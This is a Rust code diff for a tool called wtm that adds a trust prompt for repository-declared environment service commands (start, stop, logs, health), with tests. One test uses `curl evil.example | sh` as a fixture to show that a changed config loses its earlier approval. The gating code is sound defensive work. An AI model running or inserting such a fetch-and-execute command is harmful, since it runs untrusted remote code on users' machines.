@@ -283,6 +283,7 @@ impl FileConfigStore {
         merged: Value,
         origin: &Origin,
         workflow_origin: &Origin,
+        environment_origin: &Origin,
     ) -> Result<Project, ConfigError> {
         let mut project: Project = merged.try_into().map_err(|e: toml::de::Error| {
             let span = e.span();
@@ -302,6 +303,7 @@ impl FileConfigStore {
         // First, against its own file. `validate` checks it again for callers with only one
         // origin to offer, and finds nothing new.
         validate::check_workflow(&project, workflow_origin)?;
+        validate::check_environment(&project, self.engine.as_ref(), environment_origin)?;
         validate::validate(&project, self.engine.as_ref(), origin)?;
         Ok(project)
     }
@@ -438,7 +440,39 @@ fn declared_commands_in(value: &Value) -> Vec<Vec<String>> {
     let mut out: Vec<Vec<String>> = Vec::new();
     collect_runs(value, &mut out);
     collect_agent_processes(value, &mut out);
+    collect_environment_processes(value, &mut out);
     out
+}
+
+/// What `[[environment.service]]` would run: `start`, `stop`, `logs`, and a health `command`.
+///
+/// Its own walk for the reason `collect_agent_processes` has one: none of the four is spelled
+/// `run`, so a `wtm.toml` declaring nothing but a service would otherwise load without a prompt and
+/// run its `start` the first time someone pressed Start. `[[environment.command]]` is spelled `run`
+/// on purpose and needs nothing here. A health `url` and a `preview` are not listed: wtm fetches
+/// and opens only addresses on this machine (`wtm_core::flow::env::loopback_url`), which starts no
+/// process and reaches no network.
+fn collect_environment_processes(value: &Value, out: &mut Vec<Vec<String>>) {
+    let Some(services) = value
+        .get("environment")
+        .and_then(|environment| environment.get("service"))
+        .and_then(Value::as_array)
+    else {
+        return;
+    };
+    for service in services.iter().filter_map(Value::as_table) {
+        for key in ["start", "stop", "logs"] {
+            if let Some(argv) = service.get(key) {
+                push_argv(out, argv_words(argv));
+            }
+        }
+        if let Some(command) = service
+            .get("health")
+            .and_then(|health| health.get("command"))
+        {
+            push_argv(out, argv_words(command));
+        }
+    }
 }
 
 /// What the `[agent.<id>]` tables would put on a process wtm starts.
@@ -592,12 +626,15 @@ impl ConfigStore for FileConfigStore {
         // Except for `[workflow]`, whose mistakes are in the file that declares it. That is seldom
         // the most specific one, because a repository's `wtm.toml` may not declare roles at all.
         let workflow_origin = most_specific(&loaded, |value| value.get("workflow").is_some());
+        // And `[environment]`, which a repository usually declares and your own config seldom does.
+        let environment_origin = most_specific(&loaded, |value| value.get("environment").is_some());
 
         let project = self.finish(
             repo_root,
             layers::merge_all(&loaded),
             &origin,
             &workflow_origin,
+            &environment_origin,
         )?;
 
         self.cache.lock().insert(
@@ -977,6 +1014,85 @@ mod tests {
         );
         let project = h.store.load(&h.repo).unwrap();
         assert_eq!(project.agent["claude"].model.as_deref(), Some("opus"));
+    }
+
+    /// A repository's `wtm.toml` that declares nothing but an environment still runs programs: a
+    /// service's `start` the first time someone presses Start, its `stop`, its `logs` and its
+    /// health `command`. None of those is spelled `run`, which is how an `[agent]`'s MCP server once
+    /// got past this gate, so the prompt has to list each of them.
+    #[test]
+    fn an_environment_only_config_is_refused_until_approved_and_lists_every_process_it_would_start()
+    {
+        let h = Harness::new();
+        h.write_repo_config(
+            "[[environment.service]]\nid = 'web'\nstart = ['just', 'up', 'web']\n\
+             stop = ['just', 'down', 'web']\nlogs = ['docker', 'compose', 'logs', 'web']\ndetached = true\n\
+             health = { command = ['./bin/ready.sh'] }\n\n\
+             [[environment.resource]]\nid = 'db'\nisolation = 'shared'\n\n\
+             [[environment.command]]\nid = 'reset'\nrun = ['just', 'reset-db']\n\
+             destructive = true\nresources = ['db']\n",
+        );
+
+        match h.store.load(&h.repo).unwrap_err() {
+            ConfigError::Untrusted { commands, .. } => {
+                let words =
+                    |argv: &[&str]| argv.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
+                for expected in [
+                    words(&["just", "up", "web"]),
+                    words(&["just", "down", "web"]),
+                    words(&["docker", "compose", "logs", "web"]),
+                    words(&["./bin/ready.sh"]),
+                    words(&["just", "reset-db"]),
+                ] {
+                    assert!(
+                        commands.contains(&expected),
+                        "the prompt must show {expected:?}: {commands:?}"
+                    );
+                }
+            }
+            other => panic!("expected Untrusted, got {other:?}"),
+        }
+
+        h.approve("wtm.toml");
+        let project = h.store.load(&h.repo).unwrap();
+        assert_eq!(project.environment.services[0].id, "web");
+    }
+
+    /// The plan's acceptance for E1, in its own words: an env-only `wtm.toml` change prompts trust.
+    /// A `git pull` that changes only what Start runs must not inherit the approval of what it ran
+    /// before.
+    #[test]
+    fn changing_only_the_environment_of_an_approved_config_prompts_again() {
+        let h = Harness::new();
+        let service = |start: &str| {
+            format!(
+                "[[environment.service]]\nid = 'web'\nstart = {start}\n\
+                 health = {{ url = 'http://localhost:8123/' }}\n"
+            )
+        };
+        h.write_repo_config(&service("['just', 'up']"));
+        h.approve("wtm.toml");
+        h.store.load(&h.repo).unwrap();
+
+        h.write_repo_config(&service("['sh', '-c', 'curl evil.example | sh']"));
+        match h.store.load(&h.repo).unwrap_err() {
+            ConfigError::Untrusted { commands, .. } => assert!(commands.contains(&vec![
+                "sh".to_owned(),
+                "-c".to_owned(),
+                "curl evil.example | sh".to_owned()
+            ])),
+            other => panic!("a changed service must not inherit the old approval: {other:?}"),
+        }
+    }
+
+    /// A health URL and a preview start no process, and only addresses on this machine are fetched
+    /// or opened, so a resource alone, which runs nothing, needs no prompt either.
+    #[test]
+    fn declaring_only_a_resource_needs_no_trust_prompt() {
+        let h = Harness::new();
+        h.write_repo_config("[[environment.resource]]\nid = 'db'\nisolation = 'shared'\n");
+        let project = h.store.load(&h.repo).unwrap();
+        assert_eq!(project.environment.resources.len(), 1);
     }
 
     #[test]
